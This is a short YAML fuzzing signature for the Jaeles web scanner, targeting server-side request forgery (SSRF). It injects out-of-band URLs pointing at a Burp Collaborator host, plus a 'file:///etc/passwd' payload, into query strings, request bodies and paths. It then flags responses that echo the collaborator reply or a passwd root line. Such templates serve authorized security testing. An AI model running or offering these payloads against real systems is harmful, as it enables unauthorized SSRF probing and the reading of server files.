id: SSRF
type: fuzz
info:
  name: SSRF
  risk: High
  author: "@GochaOqradze"
   
# jaeles scan -p 'dest=xx.burpcollaborator.net' ...
params:
  - dest: '{{.oob}}'

payloads: 
  - "http://{{.Domain}}.{{.dest}}/{{.URL}}"
  - "https://{{.Domain}}.{{.dest}}/{{.URL}}"
  - "file:///etc/passwd"

requests:
  - redirect: true
  - generators:
      - Query("{{.payload}}")
      - Body("{{.payload}}")
      - Path("{{.payload}}", "*")

  - detections:
      - >-
        RegexSearch("Resbody", "(?m)<html><body>[a-z0-9]+</body>|root:[x*]:0:0:")
